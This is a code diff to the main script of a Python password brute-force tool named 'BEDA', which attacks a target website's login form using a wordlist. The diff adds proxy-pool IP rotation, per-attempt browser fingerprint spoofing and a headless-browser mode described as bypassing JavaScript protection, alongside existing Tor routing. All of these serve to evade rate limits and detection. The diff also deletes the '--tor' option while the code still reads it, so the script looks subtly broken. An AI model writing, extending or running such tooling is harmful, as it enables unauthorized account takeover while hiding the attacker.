@@ -12,6 +12,8 @@ from rich import box
 from banner import show_banner
 from brute import run_brute
 from tor_manager import start_tor
+from proxy_manager import ProxyPool
+from headless import headless_brute
 
 console = Console()
 
@@ -31,7 +33,10 @@ parser.add_argument("--user-field",         help="Override username field name")
 parser.add_argument("--pass-field",         help="Override password field name")
 parser.add_argument("--success-text",       help="Text that appears on successful login")
 parser.add_argument("--fail-text",          help="Text that appears on failed login")
-parser.add_argument("--tor",                action="store_true", help="Route through Tor")
+parser.add_argument("--spoof",   action="store_true", help="Spoof browser fingerprint & User-Agent per attempt")
+parser.add_argument("--browser", action="store_true", help="Use headless Chromium browser (bypasses JS protection)")
+parser.add_argument("-P",  "--proxies",     help="Proxy list file (http/socks5)")
+parser.add_argument("--no-validate",        action="store_true", help="Skip proxy validation")
 parser.add_argument("--rotate-every",       type=int, default=2, help="Rotate IP every N attempts (default: 2)")
 parser.add_argument("--delay",              type=float, default=0, help="Delay between attempts in seconds")
 parser.add_argument("--timeout",            type=int, default=5, help="Request timeout")
@@ -59,6 +64,15 @@ if args.data:
             k, v = d.split("=", 1)
             extra_data[k.strip()] = v.strip()
 
+# ─── Proxy Pool setup ─────────────────────────────────────────
+proxy_pool = None
+if args.proxies:
+    console.print(f"  [cyan][BEDA] Loading proxy pool...[/cyan]")
+    proxy_pool = ProxyPool(args.proxies, validate=not args.no_validate)
+    if not proxy_pool.has_proxies():
+        console.print(f"  [red][BEDA] No working proxies found![/red]")
+        exit(1)
+
 # ─── Tor setup ───────────────────────────────────────────────
 if args.tor:
     console.print("  [cyan][BEDA] Initializing Tor...[/cyan]")
@@ -69,6 +83,9 @@ console.print(f"  [bold red]Target    : {args.target}[/bold red]")
 console.print(f"  [bold red]Username  : {args.username}[/bold red]")
 console.print(f"  [bold red]Wordlist  : {args.wordlist}[/bold red]")
 console.print(f"  [bold red]Tor       : {'ON 🧅' if args.tor else 'OFF'}[/bold red]")
+console.print(f"  [bold red]Proxies   : {proxy_pool.available() if proxy_pool else 'OFF'}[/bold red]")
+console.print(f"  [bold red]Spoof     : {'ON 🎭' if args.spoof else 'OFF'}[/bold red]")
+console.print(f"  [bold red]Browser   : {'ON 🌐' if args.browser else 'OFF'}[/bold red]")
 console.print(f"  [bold red]Verbose   : {'ON 🔍' if args.verbose else 'OFF'}[/bold red]")
 if args.tor:
     console.print(f"  [bold red]Rotate IP : every {args.rotate_every} attempts[/bold red]")
@@ -80,22 +97,40 @@ console.print(f"\n  [yellow][BEDA] Starting attack...[/yellow]\n")
 start = time.time()
 
 # ─── Run ──────────────────────────────────────────────────────
-result = run_brute(
-    url=args.target,
-    username=args.username,
-    wordlist=args.wordlist,
-    user_field=args.user_field,
-    pass_field=args.pass_field,
-    success_text=args.success_text,
-    fail_text=args.fail_text,
-    rotate_every=args.rotate_every,
-    use_tor=args.tor,
-    delay=args.delay,
-    timeout=args.timeout,
-    verbose=args.verbose,
-    extra_headers=extra_headers if extra_headers else None,
-    extra_data=extra_data if extra_data else None,
-)
+if args.browser:
+    console.print("  [cyan][BEDA] Switching to Headless Browser mode...[/cyan]")
+    result = headless_brute(
+        url=args.target,
+        username=args.username,
+        wordlist=args.wordlist,
+        user_field=args.user_field,
+        pass_field=args.pass_field,
+        success_text=args.success_text,
+        fail_texts=[args.fail_text] if args.fail_text else None,
+        timeout=args.timeout,
+        verbose=args.verbose,
+        delay=args.delay,
+        use_tor=args.tor,
+    )
+else:
+    result = run_brute(
+        url=args.target,
+        username=args.username,
+        wordlist=args.wordlist,
+        user_field=args.user_field,
+        pass_field=args.pass_field,
+        success_text=args.success_text,
+        fail_text=args.fail_text,
+        rotate_every=args.rotate_every,
+        use_tor=args.tor,
+        proxy_pool=proxy_pool,
+        delay=args.delay,
+        timeout=args.timeout,
+        verbose=args.verbose,
+        extra_headers=extra_headers if extra_headers else None,
+        extra_data=extra_data if extra_data else None,
+        spoof_fingerprint=args.spoof,
+    )
 
 elapsed = round(time.time() - start, 2)
 
